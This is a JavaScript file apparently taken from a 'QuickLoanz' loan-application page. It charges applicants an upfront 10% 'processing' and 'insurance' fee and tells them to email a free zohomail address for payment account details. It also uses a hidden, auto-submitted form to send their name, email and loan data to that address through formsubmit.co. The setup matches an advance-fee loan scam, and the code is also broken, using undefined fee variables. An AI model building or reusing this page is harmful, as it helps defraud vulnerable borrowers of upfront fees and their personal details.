/**
 * Processing Fee Payment Handler
 * Generates unique payment codes and manages payment instructions
 */

// Fee calculation rates
const APPLICATION_FEE_RATE = 0.04; // 4%
const INSURANCE_FEE_RATE = 0.06;  // 6%

// Initialize page
document.addEventListener('DOMContentLoaded', function() {
    loadApplicationData();
    calculateFees();
});

// Load application data from sessionStorage or localStorage
function loadApplicationData() {
    // Try sessionStorage first, then localStorage
    const storedData = {
        name: sessionStorage.getItem('applicantName') || localStorage.getItem('applicantName') || 'Applicant',
        email: sessionStorage.getItem('applicantEmail') || localStorage.getItem('applicantEmail') || 'applicant@example.com',
        loanType: sessionStorage.getItem('loanType') || localStorage.getItem('loanType') || 'Personal Loan',
        loanAmount: sessionStorage.getItem('loanAmount') || localStorage.getItem('loanAmount') || '0'
    };
    
    // Display the data in summary
    document.getElementById('summaryName').textContent = storedData.name;
    document.getElementById('summaryEmail').textContent = storedData.email;
    document.getElementById('summaryLoanType').textContent = storedData.loanType;
    
    // Format and display loan amount
    const loanAmount = parseFloat(storedData.loanAmount.replace(/[^0-9.-]+/g, ''));
    document.getElementById('summaryLoanAmount').textContent = formatCurrency(loanAmount);
    
    // Store data globally for use in other functions
    window.applicantData = {
        name: storedData.name,
        email: storedData.email,
        loanType: storedData.loanType,
        loanAmount: loanAmount
    };
}

// Calculate application and insurance fees
function calculateFees() {
    const loanAmount = window.applicantData ? window.applicantData.loanAmount : 0;
    
    // Calculate fees
    const processingFee = loanAmount * APPLICATION_FEE_RATE;
    const insuranceFee = loanAmount * INSURANCE_FEE_RATE;
    const totalFee = processingFee + insuranceFee;
    
    // Display fees
    document.getElementById('applicationFee').textContent = formatCurrency(applicationFee);
    document.getElementById('insuranceFee').textContent = formatCurrency(insuranceFee);
    document.getElementById('totalFee').textContent = formatCurrency(totalFee);
    
    // Store fees globally
    window.calculatedFees = {
        application: applicationFee,
        insurance: insuranceFee,
        total: totalFee
    };
}

// Format number as currency
function formatCurrency(amount) {
    return '$' + amount.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

// Generate unique payment code
function generatePaymentCode() {
    // Generate payment code format: QL-YYYYMMDD-XXXX
    const today = new Date();
    const year = today.getFullYear();
    const month = String(today.getMonth() + 1).padStart(2, '0');
    const day = String(today.getDate()).padStart(2, '0');
    const random = Math.floor(1000 + Math.random() * 9000); // 4-digit random number
    
    const paymentCode = `QL-${year}${month}${day}-${random}`;
    
    // Store payment code
    window.paymentCode = paymentCode;
    
    // Show payment instructions
    showPaymentInstructions(paymentCode);
    
    // Send notification email
    sendPaymentCodeEmail(paymentCode);
    
    return paymentCode;
}

// Show payment instructions with generated code
function showPaymentInstructions(paymentCode) {
    // Hide summary step
    document.getElementById('summaryStep').classList.remove('active');
    
    // Show instructions step
    document.getElementById('paymentInstructions').classList.add('active');
    
    // Display payment code
    document.getElementById('generatedCode').textContent = paymentCode;
    document.getElementById('summaryPaymentCode').textContent = paymentCode;
    
    // Fill in applicant information
    document.getElementById('summaryPaymentName').textContent = window.applicantData.name;
    document.getElementById('instructionTotalFee').textContent = formatCurrency(window.calculatedFees.total);
    document.getElementById('summaryPaymentAmount').textContent = formatCurrency(window.calculatedFees.total);
    
    // Update mailto link
    updateMailtoLink(paymentCode);
}

// Update mailto link with payment code and details
function updateMailtoLink(paymentCode) {
    const subject = `Payment Request - Code: ${paymentCode}`;
    const body = `Hello,

I would like to complete my loan application payment.

Payment Code: ${paymentCode}
Name: ${window.applicantData.name}
Email: ${window.applicantData.email}
Loan Amount: ${formatCurrency(window.applicantData.loanAmount)}
Processing Fee Due: ${formatCurrency(window.calculatedFees.total)}

Please send me the payment account details.

Thank you`;
    
    const mailtoLink = `mailto:quickloanz@zohomail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    document.getElementById('sendEmailBtn').href = mailtoLink;
}

// Copy payment code to clipboard
function copyPaymentCode() {
    const paymentCode = document.getElementById('generatedCode').textContent;
    
    // Modern clipboard API
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(paymentCode).then(function() {
            showCopySuccess('Payment code copied!');
        }).catch(function(err) {
            fallbackCopyTextToClipboard(paymentCode);
        });
    } else {
        fallbackCopyTextToClipboard(paymentCode);
    }
}

// Fallback copy method for older browsers
function fallbackCopyTextToClipboard(text) {
    const tempInput = document.createElement('textarea');
    tempInput.value = text;
    tempInput.style.position = 'fixed';
    tempInput.style.opacity = '0';
    document.body.appendChild(tempInput);
    tempInput.select();
    
    try {
        document.execCommand('copy');
        showCopySuccess('Payment code copied!');
    } catch (err) {
        console.error('Failed to copy:', err);
        showCopySuccess('Failed to copy. Please copy manually.');
    }
    
    document.body.removeChild(tempInput);
}

// Show copy success message
function showCopySuccess(message) {
    // Create toast notification
    const toast = document.createElement('div');
    toast.className = 'copy-toast';
    toast.textContent = message;
    document.body.appendChild(toast);
    
    // Show toast
    setTimeout(() => toast.classList.add('show'), 10);
    
    // Hide and remove toast
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => document.body.removeChild(toast), 300);
    }, 2000);
}

// Send payment code notification email
function sendPaymentCodeEmail(paymentCode) {
    // Create hidden form to submit notification
    const form = document.createElement('form');
    form.action = 'https://formsubmit.co/quickloanz@zohomail.com';
    form.method = 'POST';
    form.target = 'paymentFrame';
    
    // Add form fields
    const fields = {
        '_subject': `New Payment Code Generated - ${paymentCode}`,
        '_template': 'table',
        '_captcha': 'false',
        '_cc': window.applicantData.email, // CC the applicant
        'Payment Code': paymentCode,
        'Applicant Name': window.applicantData.name,
        'Applicant Email': window.applicantData.email,
        'Loan Type': window.applicantData.loanType,
        'Loan Amount': formatCurrency(window.applicantData.loanAmount),
        'Application Fee': formatCurrency(window.calculatedFees.processing),
        'Insurance Fee': formatCurrency(window.calculatedFees.insurance),
        'Total Fee Due': formatCurrency(window.calculatedFees.total),
        'Generated At': new Date().toLocaleString(),
        'Status': 'Awaiting Payment Instructions Request',
        'Instructions': 'Applicant will email quickloanz@zohomail.com with this payment code to receive account details'
    };
    
    for (const [name, value] of Object.entries(fields)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
    }
    
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

// Back to summary (if needed)
function backToSummary() {
    document.getElementById('paymentInstructions').classList.remove('active');
    document.getElementById('summaryStep').classList.add('active');
}

